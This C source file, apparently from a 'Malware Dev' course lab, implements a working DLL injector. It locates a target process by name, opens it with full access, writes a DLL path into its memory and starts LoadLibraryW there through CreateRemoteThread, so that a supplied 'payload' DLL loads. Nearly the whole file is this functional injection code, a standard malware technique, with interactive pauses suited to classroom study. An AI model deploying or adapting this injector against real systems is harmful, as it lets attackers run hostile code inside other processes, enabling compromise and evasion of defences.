/*
* Lab 08 | Malware Dev Fall 2023
* DLL Injector
* coremed | willjcim
*/

#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>


// DLL injection function, returns BOOL
BOOL InjectDLL(HANDLE hProc, LPWSTR DllName) {
	// Init needed variables
	BOOL bSTATE = TRUE;
	LPVOID pLoadLibraryW = NULL;
	LPVOID pAddr = NULL;
	DWORD dwSizeOfDll = lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T lpNumberOfBytes = NULL;
	HANDLE hThread = NULL;

	// Getting the base address of LoadLibraryW function
	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	// Allocating memory in hProcess and memory permissions set to read and write
	pAddr = VirtualAllocEx(hProc, NULL, dwSizeOfDll, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddr == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddr, dwSizeOfDll);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	// Writing DllName to the allocated memory pAddress
	if (!WriteProcessMemory(hProc, pAddr, DllName, dwSizeOfDll, &lpNumberOfBytes) || lpNumberOfBytes != dwSizeOfDll) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytes);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	// Running LoadLibraryW in a new thread, passing pAddress as a parameter which contains the DLL name
	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pAddr, NULL, NULL);
	if (hThread == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] DONE !\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}


// TAKEN FROM LAB 04
// function to get handle of remote process, returns BOOL
BOOL GetRemoteProcHandle(LPWSTR szProcName, DWORD* dwProcId, HANDLE* hProc) {
	// declare our Handle and ProcessEntry32
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 Proc;
	Proc.dwSize = sizeof(PROCESSENTRY32);

	// take a snapshot of all running processes
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// fetch info from first proc in the snapshot
	if (!Process32First(hSnapShot, &Proc)) {
		printf("Process32First Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// begin loop
	// iterate through all process in snapshot
	do {
		WCHAR lowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD dwSize = lstrlenW(Proc.szExeFile);
			DWORD i = 0;
			RtlSecureZeroMemory(lowerName, MAX_PATH * 2);

			// converting each charachter in Proc.szExeFile to a lower case character and saving it
			// in lowerName to do the *wcscmp* call later

			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++) {
					lowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				}
				// C strings are NULL terminated
				lowerName[i++] = '\0';
			}
		}

		// compare process snapshot path with process path from argument
		if (wcscmp(lowerName, szProcName) == 0) {
			// save PID
			*dwProcId = Proc.th32ProcessID;
			// open process handle and return
			*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProc == NULL) {
				printf("OpenProcess Failed With Error : %d \n", GetLastError());
			}
			break;
		}
		// get next process, iterate
	} while (Process32Next(hSnapShot, &Proc));

	// check if our Handle is NULL, return
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcId == NULL || *hProc == NULL)
		return FALSE;
	return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

	HANDLE	hProcess = NULL;
	DWORD	dwProcessId = NULL;

	// Checking command line arguments
	if (argc < 3) {
		wprintf(L"[!] Usage : \"%s\" <Complete Dll Payload Path> <Process Name> \n", argv[0]);
		return -1;
	}

	// Getting the handle of the remote process
	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[2]);
	if (!GetRemoteProcHandle(argv[2], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	wprintf(L"[+] DONE \n");



	printf("[i] Found Target Process Pid: %d \n", dwProcessId);
	// Injecting the DLL
	if (!InjectDLL(hProcess, argv[1])) {
		return -1;
	}


	CloseHandle(hProcess);
	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}